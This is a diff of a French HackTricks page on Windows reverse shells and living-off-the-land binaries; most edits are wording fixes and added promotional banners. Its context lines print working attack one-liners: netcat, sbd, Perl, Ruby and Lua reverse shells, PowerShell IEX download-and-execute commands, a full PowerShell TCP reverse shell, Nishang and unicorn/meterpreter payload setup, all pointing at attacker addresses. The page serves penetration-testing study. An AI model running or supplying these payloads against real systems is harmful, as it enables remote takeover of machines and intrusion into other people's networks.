@@ -8,16 +8,24 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
 La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
-De toute évidence, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal) utilisés pour effectuer des actions inattendues telles que **exécuter du code arbitraire.**
+Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal)utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire.**
 
 ## NC
 ```bash
@@ -25,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles que le chiffrement fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles qu'un cryptage fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -48,13 +56,13 @@ perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprot
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
+
+Ruby is a dynamic, open-source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is commonly used for web development and scripting tasks.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
-
-Lua is a powerful, efficient, lightweight, embeddable scripting language. It is often used in the context of game development, but it can also be used for general-purpose scripting. Lua scripts can be executed within a Lua interpreter or embedded into other programs written in languages such as C or C++. Lua scripts can be used to automate tasks, extend the functionality of a program, or even create standalone applications. Lua is known for its simplicity and flexibility, making it a popular choice among developers for various applications.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -82,14 +90,14 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processus effectuant un appel réseau : **powershell.exe**\
-Charge utile écrite sur le disque : **NON** (_du moins nulle part où j'ai pu trouver en utilisant procmon !_)
+Charge utile écrite sur le disque : **NON** (_du moins nulle part que j'ai pu trouver en utilisant procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **Cache local du client WebDAV**
+Processus effectuant un appel réseau : **svchost.exe**\
+Charge utile écrite sur le disque : **cache local du client WebDAV**
 
-**En une ligne:**
+**En une ligne :**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -379,7 +387,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Dans le dossier **Shells**, il y a beaucoup de coquilles différentes. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier:
+Dans le dossier **Shells**, il y a beaucoup de shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -438,7 +446,7 @@ Créez une version powershell de la porte dérobée metasploit en utilisant unic
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Commencez msfconsole avec la ressource créée :
+Lancez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
@@ -464,6 +472,12 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -472,7 +486,7 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
